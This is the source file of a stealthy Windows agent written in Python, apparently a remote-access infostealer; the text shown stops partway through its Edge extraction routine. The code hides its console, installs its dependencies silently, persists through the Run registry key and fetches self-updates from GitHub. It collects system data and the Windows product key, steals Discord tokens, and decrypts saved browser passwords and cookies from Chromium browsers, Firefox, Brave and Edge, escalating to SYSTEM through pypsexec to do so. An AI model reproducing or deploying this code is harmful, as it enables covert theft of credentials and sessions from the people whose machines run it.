# -*- coding: utf-8 -*-
# client.pyw - Agent furtif avec collecte complète

# ========== ANTI-CONSOLE ABSOLU (copié depuis GithubTest) ==========
import sys
import os

if sys.platform == 'win32':
    try:
        import ctypes
        
        # Cacher la console immédiatement
        console = ctypes.windll.kernel32.GetConsoleWindow()
        if console:
            ctypes.windll.user32.ShowWindow(console, 0)
        
        # Détacher complètement de la console
        ctypes.windll.kernel32.FreeConsole()
        
    except:
        pass

# Rediriger stdout/stderr
sys.stdout = open(os.devnull, 'w')
sys.stderr = open(os.devnull, 'w')

# ========== VÉRIFICATION ANTI-DOUBLON ==========
try:
    import psutil
    current_pid = os.getpid()
    current_script = os.path.basename(__file__).lower()
    
    for proc in psutil.process_iter(['pid', 'cmdline']):
        try:
            if proc.info['pid'] == current_pid:
                continue
            cmdline = proc.info.get('cmdline') or []
            cmd_str = ' '.join(cmdline).lower()
            if current_script in cmd_str:
                sys.exit(0)
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
except ImportError:
    pass

# ========== PHASE 1 : IMPORTS MINIMAUX POUR INSTALLATION ==========
import subprocess
import importlib
import importlib.metadata

REQUIRED_PACKAGES = [
    'requests',
    'psutil',
    'pywin32',
    'pyperclip',
    'keyboard',
    'mss',
    'pycryptodome',
    'pypsexec',
    'websocket-client',
    'opencv-python',
    'pillow'
]

def install_package(package):
    try:
        subprocess.check_call(
            [sys.executable, '-m', 'pip', 'install', '--quiet', '--no-warn-script-location', package],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            creationflags=0x08000000
        )
        return True
    except:
        return False

def check_and_install_dependencies():
    missing = []
    for pkg in REQUIRED_PACKAGES:
        pkg_import = pkg.replace('-', '_').replace('opencv-python', 'cv2').replace('pillow', 'PIL')
        if pkg == 'pywin32':
            try:
                import win32api
            except ImportError:
                missing.append(pkg)
        elif pkg == 'pycryptodome':
            try:
                from Crypto.Cipher import AES
            except ImportError:
                missing.append(pkg)
        elif pkg == 'opencv-python':
            try:
                import cv2
            except ImportError:
                missing.append(pkg)
        elif pkg == 'pillow':
            try:
                from PIL import Image
            except ImportError:
                missing.append(pkg)
        else:
            try:
                importlib.metadata.version(pkg_import)
            except (ImportError, importlib.metadata.PackageNotFoundError):
                missing.append(pkg)
    
    if missing:
        for pkg in missing:
            install_package(pkg)
        
        # Redémarrer avec pythonw.exe SANS CONSOLE
        pythonw_path = sys.executable
        if not pythonw_path.lower().endswith('pythonw.exe'):
            alt_path = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
            if os.path.exists(alt_path):
                pythonw_path = alt_path
        
        subprocess.Popen(
            [pythonw_path] + sys.argv,
            creationflags=0x08000000,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            close_fds=True,
            shell=False
        )
        sys.exit(0)

check_and_install_dependencies()

# ========== PHASE 2 : TOUS LES AUTRES IMPORTS ==========
import json
import base64
import time
import threading
import ctypes
import tempfile
import shutil
import sqlite3
import re
import configparser
import binascii
import socket
from datetime import datetime, timedelta, timezone
import requests
import psutil
import win32crypt
import pyperclip
from Crypto.Cipher import AES
import mss
import mss.tools
from pypsexec.client import Client

# ========== CONFIGURATION DU CLIENT ==========
SERVER_URL = "http://127.0.0.1:5000"
HEARTBEAT_INTERVAL = 300
COMMAND_POLL_INTERVAL = 5

CLIENT_VERSION_URL = "https://raw.githubusercontent.com/Paladu13/test/main/client_version"
CLIENT_UPDATE_URL = "https://raw.githubusercontent.com/Paladu13/test/main/client.pyw"

SCRIPT_DIR = os.path.dirname(os.path.abspath(sys.argv[0]))
CONFIG_FILE = os.path.join(SCRIPT_DIR, "client_config.txt")

PATHS = {
    'Discord': os.getenv('APPDATA') + '\\discord',
    'Discord Canary': os.getenv('APPDATA') + '\\discordcanary',
    'Lightcord': os.getenv('APPDATA') + '\\Lightcord',
    'Discord PTB': os.getenv('APPDATA') + '\\discordptb',
}

BROWSER_PROCESS_NAMES = {
    'opera':    ['opera.exe'],
    'operagx':  ['opera.exe', 'operagx.exe'],
    'brave':    ['brave.exe'],
    'edge':     ['msedge.exe'],
    'firefox':  ['firefox.exe']
}

EXCLUDE_DOMAINS = ['.msn.com', 'assets.msn.com', 'ntp.msn.com', 'srtb.msn.com']
IS_ADMIN = ctypes.windll.shell32.IsUserAnAdmin() != 0
MACHINE_ID = None

# ========== FONCTIONS DE CONFIGURATION LOCALE ==========
def load_client_config():
    if not os.path.exists(CONFIG_FILE):
        return {}
    try:
        with open(CONFIG_FILE, 'r') as f:
            return json.load(f)
    except:
        return {}

def save_client_config(cfg):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(cfg, f)

def get_client_config(key, default=None):
    return load_client_config().get(key, default)

def set_client_config(key, value):
    cfg = load_client_config()
    cfg[key] = value
    save_client_config(cfg)

# ========== ID MACHINE ==========
def get_machine_id():
    global MACHINE_ID
    if MACHINE_ID:
        return MACHINE_ID
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Cryptography")
        MACHINE_ID = winreg.QueryValueEx(key, "MachineGuid")[0]
        winreg.CloseKey(key)
        return MACHINE_ID
    except:
        MACHINE_ID = os.getenv('COMPUTERNAME', 'unknown')
        return MACHINE_ID

# ========== FONCTIONS SYSTÈME ==========
def format_bytes(n):
    if n == 0:
        return "0 B"
    units = ['B','KB','MB','GB','TB']
    i = 0
    while n >= 1024 and i < len(units)-1:
        n /= 1024.0
        i += 1
    return f"{n:.1f} {units[i]}"

def get_public_ip():
    try:
        r = requests.get('https://api.ipify.org?format=json', timeout=5)
        return r.json().get('ip', 'Unknown')
    except:
        pass
    try:
        r = requests.get('https://api.my-ip.io/ip', timeout=5)
        return r.text.strip()
    except:
        pass
    return 'Unknown'

def get_all_ips():
    ips = {'ipv4': [], 'ipv6': []}
    try:
        hostname = socket.gethostname()
        for info in socket.getaddrinfo(hostname, None):
            addr = info[4][0]
            if ':' in addr:
                if addr not in ips['ipv6']:
                    ips['ipv6'].append(addr)
            else:
                if addr not in ips['ipv4'] and not addr.startswith('127.'):
                    ips['ipv4'].append(addr)
    except:
        pass
    return ips

def get_mac_address():
    try:
        import uuid
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                        for elements in range(0, 48, 8)][::-1])
        return mac.upper()
    except:
        return "Unknown"

def get_windows_key():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
        digital_product_id = winreg.QueryValueEx(key, "DigitalProductId")[0]
        winreg.CloseKey(key)
        key_offset = 52
        chars = "BCDFGHJKMPQRTVWXY2346789"
        product_key = ""
        data = list(digital_product_id[key_offset:key_offset+15])
        for i in range(24, -1, -1):
            r = 0
            for j in range(14, -1, -1):
                r = (r * 256) ^ data[j]
                data[j] = r // 24
                r %= 24
            product_key = chars[r] + product_key
            if i % 5 == 0 and i != 0:
                product_key = '-' + product_key
        return product_key
    except:
        return None

def get_cpu_info():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"HARDWARE\DESCRIPTION\System\CentralProcessor\0")
        cpu_name = winreg.QueryValueEx(key, "ProcessorNameString")[0]
        winreg.CloseKey(key)
        return cpu_name.strip()
    except:
        return "Unknown"

def get_gpu_info():
    gpus = []
    try:
        result = subprocess.run(
            ['wmic', 'path', 'win32_VideoController', 'get', 'name'],
            capture_output=True, text=True, timeout=10,
            creationflags=0x08000000
        )
        lines = result.stdout.strip().split('\n')
        for line in lines[1:]:
            name = line.strip()
            if name and name not in gpus:
                gpus.append(name)
    except:
        pass
    if not gpus:
        try:
            import winreg
            i = 0
            while True:
                try:
                    key_path = f"SYSTEM\\CurrentControlSet\\Control\\Class\\{{4d36e968-e325-11ce-bfc1-08002be10318}}\\{str(i).zfill(4)}"
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, key_path)
                    try:
                        driver_desc = winreg.QueryValueEx(key, "DriverDesc")[0]
                        if driver_desc and driver_desc not in gpus:
                            gpus.append(driver_desc)
                    except:
                        pass
                    winreg.CloseKey(key)
                    i += 1
                except:
                    break
        except:
            pass
    return gpus if gpus else ["Unknown"]

def get_motherboard_info():
    try:
        result = subprocess.run(
            ['wmic', 'baseboard', 'get', 'Manufacturer,Product,Version', '/format:csv'],
            capture_output=True, text=True, timeout=10,
            creationflags=0x08000000
        )
        lines = result.stdout.strip().split('\n')
        if len(lines) >= 3:
            data_line = lines[2] if len(lines) > 2 else lines[1]
            parts = data_line.split(',')
            if len(parts) >= 4:
                return {
                    'manufacturer': parts[1].strip() if parts[1].strip() else 'Unknown',
                    'product': parts[2].strip() if parts[2].strip() else 'Unknown',
                    'version': parts[3].strip() if parts[3].strip() else 'N/A'
                }
    except:
        pass
    return {'manufacturer': 'Unknown', 'product': 'Unknown', 'version': 'N/A'}

def get_bios_info():
    bios_vendor = "Unknown"
    bios_version = "Unknown"
    bios_date = ""
    try:
        result = subprocess.run(
            ['wmic', 'bios', 'get', 'Manufacturer,SMBIOSBIOSVersion,ReleaseDate', '/format:csv'],
            capture_output=True, text=True, timeout=10,
            creationflags=0x08000000
        )
        lines = result.stdout.strip().split('\n')
        if len(lines) >= 3:
            data_line = lines[2] if len(lines) > 2 else lines[1]
            parts = data_line.split(',')
            if len(parts) >= 4:
                manufacturer = parts[1].strip()
                version = parts[2].strip()
                release_date = parts[3].strip()
                if manufacturer:
                    bios_vendor = manufacturer
                if version:
                    bios_version = version
                if release_date:
                    try:
                        dt = datetime.strptime(release_date[:8], '%Y%m%d')
                        bios_date = dt.strftime('%d/%m/%Y')
                    except:
                        bios_date = release_date
                if bios_vendor != "Unknown" and bios_version != "Unknown":
                    return f"{bios_vendor} {bios_version} ({bios_date})" if bios_date else f"{bios_vendor} {bios_version}"
    except:
        pass
    if bios_version != "Unknown":
        return bios_version
    return "Unknown"

def get_default_browser():
    try:
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice")
        browser_id = winreg.QueryValueEx(key, "Progid")[0]
        winreg.CloseKey(key)
        browser_names = {
            'ChromeHTML': 'Google Chrome',
            'MSEdgeHTM': 'Microsoft Edge',
            'FirefoxURL': 'Mozilla Firefox',
            'OperaStable': 'Opera',
            'BraveHTML': 'Brave'
        }
        return browser_names.get(browser_id, browser_id)
    except:
        return "Unknown"

def get_antivirus():
    av_list = []
    try:
        result = subprocess.run(
            ['wmic', '/namespace:\\\\root\\SecurityCenter2', 'path', 'AntiVirusProduct', 'get', 'displayName'],
            capture_output=True, text=True, timeout=10,
            creationflags=0x08000000
        )
        lines = result.stdout.strip().split('\n')
        for line in lines[1:]:
            name = line.strip()
            if name and name not in av_list:
                av_list.append(name)
    except:
        pass
    return av_list if av_list else ["Aucun détecté"]

def get_windows_version():
    try:
        import platform
        import winreg
        ver = platform.win32_ver()
        release = ver[0]
        build = ver[1]
        edition = ""
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion")
            edition = winreg.QueryValueEx(key, "EditionID")[0]
            winreg.CloseKey(key)
        except:
            pass
        if edition:
            return f"Windows {release} {edition} (Build {build.split('.')[-1]})"
        else:
            return f"Windows {release} (Build {build.split('.')[-1]})"
    except:
        return "Unknown"

def get_disk_usage():
    try:
        usage = psutil.disk_usage('/')
        return {
            'total': usage.total,
            'free': usage.free,
            'used': usage.used,
            'percent': usage.percent,
            'total_str': format_bytes(usage.total),
            'free_str': format_bytes(usage.free),
            'used_str': format_bytes(usage.used)
        }
    except:
        return {'total':0,'free':0,'used':0,'percent':0}

def get_memory_info():
    try:
        mem = psutil.virtual_memory()
        return {
            'total': mem.total,
            'available': mem.available,
            'used': mem.used,
            'percent': mem.percent,
            'total_str': format_bytes(mem.total),
            'available_str': format_bytes(mem.available),
            'used_str': format_bytes(mem.used)
        }
    except:
        return {'total':0,'available':0,'used':0,'percent':0}

def get_system_info():
    disk = get_disk_usage()
    ram = get_memory_info()
    local_ips = get_all_ips()
    public_ip = get_public_ip()
    motherboard = get_motherboard_info()
    gpus = get_gpu_info()
    antivirus = get_antivirus()
    
    client_version = get_client_config('version', 'unknown')
    last_update = get_client_config('last_update', datetime.now(timezone.utc).isoformat())
    
    return {
        'machine_id': get_machine_id(),
        'computer_name': os.getenv('COMPUTERNAME', ''),
        'username': os.getenv('USERNAME', ''),
        'windows_version': get_windows_version(),
        'windows_key': get_windows_key(),
        'hwid': get_machine_id(),
        'ip_public': public_ip,
        'ip': public_ip,
        'ipv4': local_ips.get('ipv4', []),
        'ipv6': local_ips.get('ipv6', []),
        'mac_address': get_mac_address(),
        'cpu': get_cpu_info(),
        'gpu': gpus,
        'motherboard': motherboard,
        'bios_version': get_bios_info(),
        'default_browser': get_default_browser(),
        'antivirus': antivirus,
        'disk': disk,
        'ram': ram,
        'client_version': client_version,
        'last_update': last_update,
        'timestamp': datetime.now(timezone.utc).isoformat()
    }

# ========== AUTO‑UPDATE ==========
def get_remote_version():
    try:
        r = requests.get(CLIENT_VERSION_URL, timeout=5)
        return r.text.strip() if r.status_code == 200 else None
    except:
        return None

def get_local_version():
    return get_client_config('version')

def set_local_version(ver):
    set_client_config('version', ver)

def perform_client_update():
    remote = get_remote_version()
    local = get_local_version()
    if not remote or remote == local:
        return False
    try:
        r = requests.get(CLIENT_UPDATE_URL, timeout=15)
        if r.status_code != 200:
            return False
        
        current_script = os.path.abspath(sys.argv[0])
        
        with open(current_script, 'wb') as f:
            f.write(r.content)
        
        set_local_version(remote)
        set_client_config('last_update', datetime.now(timezone.utc).isoformat())
        
        pythonw_path = sys.executable
        if not pythonw_path.lower().endswith('pythonw.exe'):
            alt_path = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
            if os.path.exists(alt_path):
                pythonw_path = alt_path
        
        time.sleep(1)
        subprocess.Popen(
            [pythonw_path, current_script],
            creationflags=0x08000000,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL,
            close_fds=True,
            shell=False
        )
        os._exit(0)
        
    except:
        return False

# ========== PERSISTANCE ==========
def ensure_startup_persistence():
    try:
        import winreg
        
        pythonw_path = sys.executable
        if pythonw_path.lower().endswith('python.exe'):
            alt_path = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
            if os.path.exists(alt_path):
                pythonw_path = alt_path
        
        script_path = os.path.abspath(sys.argv[0])
        reg_cmd = f'"{pythonw_path}" "{script_path}"'
        
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            reg_path,
            0,
            winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "WindowsClientAgent", 0, winreg.REG_SZ, reg_cmd)
        winreg.CloseKey(key)
    except:
        pass

# ========== FONCTIONS CLIENT (COMMANDES) ==========
def getheaders(token=None):
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    }
    if token:
        headers["Authorization"] = token
    return headers

def gettokens(path):
    path += "\\Local Storage\\leveldb\\"
    tokens = []
    if not os.path.exists(path):
        return tokens
    for file in os.listdir(path):
        if not file.endswith(".ldb") and not file.endswith(".log"):
            continue
        try:
            with open(f"{path}{file}", "r", errors="ignore") as f:
                for line in (x.strip() for x in f.readlines()):
                    for values in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                        tokens.append(values)
        except:
            continue
    return tokens

def getkey(path):
    with open(path + "\\Local State", "r") as f:
        key = json.load(f)['os_crypt']['encrypted_key']
    return key

def kill_browser_process(browser_key):
    if browser_key not in BROWSER_PROCESS_NAMES:
        return
    procs = [p.info for p in psutil.process_iter(['pid', 'name']) if p.info['name']]
    for name in BROWSER_PROCESS_NAMES[browser_key]:
        for proc in procs:
            if proc['name'].lower() == name.lower():
                try:
                    psutil.Process(proc['pid']).terminate()
                except:
                    pass
        try:
            subprocess.call(f"taskkill /f /im {name} /t", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=0x08000000)
        except:
            pass
    time.sleep(2)

def chrome_date_to_str(d):
    if d <= 0:
        return "Session"
    return (datetime(1601, 1, 1) + timedelta(microseconds=d)).strftime("%Y-%m-%d %H:%M:%S")

def get_browser_encryption_key(base_path):
    local_state = os.path.join(base_path, "Local State")
    if not os.path.exists(local_state):
        return None
    try:
        with open(local_state, "r", encoding="utf-8") as f:
            encrypted_key = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def decrypt_value(enc_value, key):
    if not key or not enc_value:
        return None
    try:
        if enc_value[:3] in (b'v10', b'v11', b'v20'):
            cipher = AES.new(key, AES.MODE_GCM, nonce=enc_value[3:15])
            decrypted = cipher.decrypt_and_verify(enc_value[15:-16], enc_value[-16:])
            if len(decrypted) > 32:
                return decrypted[32:].decode(errors="ignore")
            else:
                return decrypted.decode(errors="ignore")
        else:
            return win32crypt.CryptUnprotectData(enc_value, None, None, None, 0)[1].decode(errors="ignore")
    except:
        return None

def extract_chromium_browser(browser_name, base_path, key_func=None):
    result = {'passwords': [], 'cookies': []}
    if not os.path.exists(base_path):
        return result
    key = key_func(base_path) if key_func else get_browser_encryption_key(base_path)
    if not key:
        return result
    profiles = []
    default_path = os.path.join(base_path, "Default")
    if os.path.exists(os.path.join(default_path, "Login Data")):
        profiles.append(("Default", default_path))
    for item in os.listdir(base_path):
        if item.startswith("Profile "):
            prof_path = os.path.join(base_path, item)
            if os.path.exists(os.path.join(prof_path, "Login Data")):
                profiles.append((item, prof_path))
    for profile_name, profile_path in profiles:
        login_db = os.path.join(profile_path, "Login Data")
        if os.path.exists(login_db):
            try:
                tmp = tempfile.NamedTemporaryFile(delete=False)
                tmp.close()
                shutil.copy2(login_db, tmp.name)
                conn = sqlite3.connect(tmp.name)
                for url, user, pwd in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
                    if user or pwd:
                        password = decrypt_value(pwd, key) if pwd else ""
                        if password:
                            result['passwords'].append({
                                'browser': browser_name,
                                'profile': profile_name,
                                'url': url,
                                'username': user,
                                'password': password
                            })
                conn.close()
                os.unlink(tmp.name)
            except:
                pass
        cookie_path = os.path.join(profile_path, "Network", "Cookies")
        if os.path.exists(cookie_path):
            try:
                tmp = tempfile.NamedTemporaryFile(delete=False)
                tmp.close()
                shutil.copy2(cookie_path, tmp.name)
                conn = sqlite3.connect(tmp.name)
                for host, name, path, enc_val, expires, secure, httponly in conn.execute(
                    "SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies"):
                    val = decrypt_value(enc_val, key)
                    if val:
                        result['cookies'].append({
                            'browser': browser_name,
                            'profile': profile_name,
                            'host': host,
                            'name': name,
                            'value': val,
                            'path': path,
                            'expires': chrome_date_to_str(expires),
                            'secure': bool(secure),
                            'httponly': bool(httponly)
                        })
                conn.close()
                os.unlink(tmp.name)
            except:
                pass
    return result

class NSSProxy:
    class SECItem(ctypes.Structure):
        _fields_ = [("type", ctypes.c_uint), ("data", ctypes.c_char_p), ("len", ctypes.c_uint)]
        def decode_data(self):
            return ctypes.string_at(self.data, self.len).decode('utf-8')
    class PK11SlotInfo(ctypes.Structure):
        pass
    def __init__(self):
        self.libnss = None
        nssname = "nss3.dll"
        locations = ["", "C:\\Program Files\\Mozilla Firefox", "C:\\Program Files (x86)\\Mozilla Firefox"]
        for loc in locations:
            nsslib = os.path.join(loc, nssname)
            if not os.path.exists(nsslib):
                continue
            os.environ["PATH"] = ";".join([loc, os.environ["PATH"]])
            workdir = os.getcwd()
            try:
                os.chdir(loc)
                self.libnss = ctypes.CDLL(nsslib)
                break
            finally:
                os.chdir(workdir)
        if self.libnss is None:
            raise Exception("NSS not found")
        for name, restype, *argtypes in [
            ("NSS_Init", ctypes.c_int, ctypes.c_char_p),
            ("NSS_Shutdown", ctypes.c_int),
            ("PK11_GetInternalKeySlot", ctypes.POINTER(self.PK11SlotInfo)),
            ("PK11_FreeSlot", None, ctypes.POINTER(self.PK11SlotInfo)),
            ("PK11_NeedLogin", ctypes.c_int, ctypes.POINTER(self.PK11SlotInfo)),
            ("PK11_CheckUserPassword", ctypes.c_int, ctypes.POINTER(self.PK11SlotInfo), ctypes.c_char_p),
            ("PK11SDR_Decrypt", ctypes.c_int, ctypes.POINTER(self.SECItem), ctypes.POINTER(self.SECItem), ctypes.c_void_p),
            ("SECITEM_ZfreeItem", None, ctypes.POINTER(self.SECItem), ctypes.c_int)
        ]:
            res = getattr(self.libnss, name)
            res.argtypes = argtypes
            res.restype = restype
            setattr(self, "_" + name, res)
    def initialize(self, profile):
        self._NSS_Init(("sql:" + profile).encode('utf-8'))
    def shutdown(self):
        self._NSS_Shutdown()
    def authenticate(self, profile):
        keyslot = self._PK11_GetInternalKeySlot()
        try:
            if self._PK11_NeedLogin(keyslot):
                self._PK11_CheckUserPassword(keyslot, b"")
        finally:
            self._PK11_FreeSlot(keyslot)
    def decrypt(self, data64):
        data = binascii.a2b_base64(data64)
        inp = self.SECItem(0, data, len(data))
        out = self.SECItem(0, None, 0)
        try:
            self._PK11SDR_Decrypt(inp, out, None)
            return out.decode_data()
        finally:
            self._SECITEM_ZfreeItem(out, 0)

def get_firefox_profiles():
    base_path = os.path.join(os.environ["APPDATA"], "Mozilla", "Firefox")
    profiles = []
    profileini = os.path.join(base_path, "profiles.ini")
    if not os.path.isfile(profileini):
        return []
    config = configparser.ConfigParser()
    config.read(profileini, encoding='utf-8')
    for section in config.sections():
        if section.startswith("Profile"):
            name = config.get(section, "Name", fallback="Unknown")
            path = config.get(section, "Path")
            full_path = os.path.join(base_path, path)
            if config.get(section, "IsRelative", fallback='1') == '0':
                full_path = path
            if os.path.exists(full_path):
                profiles.append((name, full_path))
    return profiles

def extract_firefox_data():
    result = {'passwords': [], 'cookies': []}
    kill_browser_process('firefox')
    time.sleep(2)
    profiles = get_firefox_profiles()
    for profile_name, profile_path in profiles:
        try:
            if not os.path.exists(os.path.join(profile_path, "key4.db")) or not os.path.exists(os.path.join(profile_path, "cert9.db")):
                continue
            moz = NSSProxy()
            moz.initialize(profile_path)
            moz.authenticate(profile_name)
            logins_json = os.path.join(profile_path, "logins.json")
            if os.path.exists(logins_json):
                with open(logins_json, "r", encoding="utf-8") as f:
                    data = json.load(f)
                for entry in data.get("logins", []):
                    try:
                        user = moz.decrypt(entry["encryptedUsername"])
                        pwd = moz.decrypt(entry["encryptedPassword"])
                        if user and pwd:
                            result['passwords'].append({
                                'browser': 'Firefox',
                                'profile': profile_name,
                                'url': entry.get("hostname"),
                                'username': user,
                                'password': pwd
                            })
                    except:
                        pass
            cookie_db = os.path.join(profile_path, "cookies.sqlite")
            if os.path.exists(cookie_db):
                tmp = tempfile.NamedTemporaryFile(delete=False)
                tmp.close()
                shutil.copy2(cookie_db, tmp.name)
                conn = sqlite3.connect(tmp.name)
                cur = conn.execute("SELECT host, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies")
                for host, name, value, path, expiry, secure, httponly in cur:
                    if value:
                        result['cookies'].append({
                            'browser': 'Firefox',
                            'profile': profile_name,
                            'host': host,
                            'name': name,
                            'value': value,
                            'path': path,
                            'expires': datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S') if expiry else 'Session',
                            'secure': bool(secure),
                            'httponly': bool(httponly)
                        })
                conn.close()
                os.unlink(tmp.name)
            moz.shutdown()
        except:
            pass
    return result

def get_brave_app_bound_key(local_state_path):
    if not os.path.exists(local_state_path) or not IS_ADMIN:
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        app_bound_encrypted_key = local_state.get("os_crypt", {}).get("app_bound_encrypted_key")
        if not app_bound_encrypted_key:
            return None
        decrypt_script = """
import win32crypt, binascii
encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
print(binascii.b2a_base64(encrypted_key[1]).decode())
"""
        c = Client("localhost")
        c.connect()
        c.create_service()
        app_bound_key = binascii.a2b_base64(app_bound_encrypted_key)
        if app_bound_key[:4] == b"APPB":
            app_bound_key = app_bound_key[4:]
        app_bound_encrypted_key_b64 = binascii.b2a_base64(app_bound_key).decode().strip()
        encrypted_key_b64, _, rc = c.run_executable(
            sys.executable,
            arguments=f'-c "{decrypt_script.format(app_bound_encrypted_key_b64)}"',
            use_system_account=True
        )
        if rc != 0:
            return None
        decrypted_key_b64, _, rc = c.run_executable(
            sys.executable,
            arguments=f'-c "{decrypt_script.format(encrypted_key_b64.decode().strip())}"',
            use_system_account=False
        )
        if rc != 0:
            return None
        decrypted_key = binascii.a2b_base64(decrypted_key_b64)
        if len(decrypted_key) < 32:
            return None
        return decrypted_key[-32:]
    except:
        return None
    finally:
        try: c.remove_service()
        except: pass
        c.disconnect()

def extract_brave_data():
    if not IS_ADMIN:
        return {'passwords': [], 'cookies': []}
    brave_path = os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data')
    if not os.path.exists(brave_path):
        return {'passwords': [], 'cookies': []}
    kill_browser_process('brave')
    key = get_brave_app_bound_key(os.path.join(brave_path, 'Local State'))
    if not key:
        key = get_browser_encryption_key(brave_path)
    if not key:
        return {'passwords': [], 'cookies': []}
    return extract_chromium_browser('Brave', brave_path, lambda x: key)

def wait_for_file_unlock(file_path, max_attempts=10):
    for _ in range(max_attempts):
        try:
            test_path = file_path + ".test"
            shutil.copy2(file_path, test_path)
            os.remove(test_path)
            return True
        except:
            time.sleep(2)
    return False

def get_edge_app_bound_key(local_state_path):
    if not os.path.exists(local_state_path) or not IS_ADMIN:
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        app_bound_encrypted_key = local_state.get("os_crypt", {}).get("app_bound_encrypted_key")
        if not app_bound_encrypted_key:
            return None
        decrypt_script = """
import win32crypt, binascii
encrypted_key = win32crypt.CryptUnprotectData(binascii.a2b_base64('{}'), None, None, None, 0)
print(binascii.b2a_base64(encrypted_key[1]).decode())
"""
        c = Client("localhost")
        c.connect()
        c.create_service()
        app_bound_key = binascii.a2b_base64(app_bound_encrypted_key)
        if app_bound_key[:4] == b"APPB":
            app_bound_key = app_bound_key[4:]
        app_bound_encrypted_key_b64 = binascii.b2a_base64(app_bound_key).decode().strip()
        encrypted_key_b64, _, rc = c.run_executable(
            sys.executable,
            arguments=f'-c "{decrypt_script.format(app_bound_encrypted_key_b64)}"',
            use_system_account=True
        )
        if rc != 0:
            return None
        decrypted_key_b64, _, rc = c.run_executable(
            sys.executable,
            arguments=f'-c "{decrypt_script.format(encrypted_key_b64.decode().strip())}"',
            use_system_account=False
        )
        if rc != 0:
            return None
        decrypted_key = binascii.a2b_base64(decrypted_key_b64)
        if len(decrypted_key) < 32:
            return None
        return decrypted_key[-32:]
    except:
        return None
    finally:
        try: c.remove_service()
        except: pass
        c.disconnect()

def get_standard_edge_key(edge_user_data_path):
    local_state = os.path.join(edge_user_data_path, "Local State")
    if not os.path.exists(local_state):
        return None
    try:
        with open(local_state, "r", encoding="utf-8") as f:
            state = json.load(f)
        encrypted_key_b64 = state.get("os_crypt", {}).get("encrypted_key")
        if not encrypted_key_b64:
            return None
        encrypted_key = base64.b64decode(encrypted_key_b64)[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except:
        return None

def extract_edge_data():
    if not IS_ADMIN:
        return {'passwords': [], 'cookies': []}
    edge_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data')
    if not os.path.exists(edge_path):
        return {'passwords': [], 'cookies': []}
    kill_browser_process('edge')
    key = get_edge_app_bound_key(os.path.join(edge_path, 'Local State'))
    if not key:
        key = get_standard_edge_key(edge_path)
    if not key:
        return {'passwords': [], 'cookies': []}

    all_passwords = []
    all_cookies = []

    def decrypt_v20(enc_val, k):
        try:
            if enc_val[:3] != b'v20':
                return None
            nonce = enc_val[3:15]
            tag = enc_val[-16:]
            data = enc_val[15:-16]
            cipher = AES.new(k, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(data, tag)
            if len(decrypted) > 32:
                return decrypted[32:].decode('utf-8', errors='ignore')
            return decrypted.decode('utf-8', errors='ignore')
        except:
            return None

    def decrypt_v10(enc_val, k=None):
        try:
            return win32crypt.CryptUnprotectData(enc_val, None, None, None, 0)[1].decode("utf-8")
        except:
            return None

    profiles = []
    for item in os.listdir(edge_path):
        prof_path = os.path.join(edge_path, item)
        if os.path.isdir(prof_path) and (os.path.exists(os.path.join(prof_path, "Login Data")) or os.path.exists(os.path.join(prof_path, "Network", "Cookies"))):
            profiles.append((item, prof_path))

    for profile_name, profile_path in profiles:
        login_db = os.path.join(profile_path, "Login Data")
        if os.path.exists(login_db):
            try:
                tmp = tempfile.NamedTemporaryFile(delete=False)
                tmp.close()
                shutil.copy2(login_db, tmp.name)
                conn = sqlite3.connect(tmp.name)
                cur = conn.cursor()
                cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='logins'")
                if cur.fetchone():
                    for origin_url, username, password_value in cur.execute("SELECT origin_url, username_value, password_value FROM logins"):
                        if username and password_value:
                            password = None
                            if password_value[:3] == b'v20':
                                password = decrypt_v20(password_value, key)
                            if not password:
                                password = decrypt_v10(password_value)
                            if password:
